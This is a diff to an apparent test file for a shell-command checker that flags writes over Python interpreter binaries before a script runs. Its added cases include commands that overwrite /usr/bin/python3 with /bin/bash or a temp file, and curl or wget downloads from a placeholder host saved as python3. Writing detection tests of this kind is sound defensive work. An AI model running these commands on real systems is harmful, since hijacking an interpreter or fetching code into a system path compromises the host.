@@ -638,6 +638,14 @@ describe('#874 (e) long interpreter files and the re-scan budget', () => {
     'cp /tmp/x -t /usr/local/bin',
     'cd /usr/local/bin && ln -sf /tmp/x python3',
     'cd /usr/local/bin; cat /tmp/x > python3',
+    // Review r6: a redirect with no space before it, a glob that may expand to
+    // an existing interpreter name, and a short option with its value attached.
+    'cat /bin/bash>/usr/bin/python3',
+    'cat /tmp/x>/usr/local/bin/python3',
+    '(cd /usr/bin && cat /tmp/x>python3)',
+    '(cd /usr/bin && cp /tmp/x python[3])',
+    '(cd /usr/bin && curl -opython3 https://example.test/x)',
+    '(cd /usr/bin && wget -Opython3 https://example.test/x)',
   ];
   it.each(BIN_WRITES.flatMap(w => [
     `${w}; python3 scripts/dual.py`,
@@ -652,6 +660,8 @@ describe('#874 (e) long interpreter files and the re-scan budget', () => {
     'ls -l /usr/local/bin/python3 && python3 scripts/dual.py',
     'cd "$REPO" && python3 scripts/dual.py',
     'cd ../other && python3 scripts/dual.py',
+    'cp *.txt out/; python3 scripts/dual.py',
+    'echo done>/tmp/log.txt; python3 scripts/dual.py',
     'mkdir -p "$OUT" && python3 scripts/dual.py',
     'which python3; python3 scripts/dual.py',
     'ls -l /usr/bin/python3; ./scripts/absdual.py',
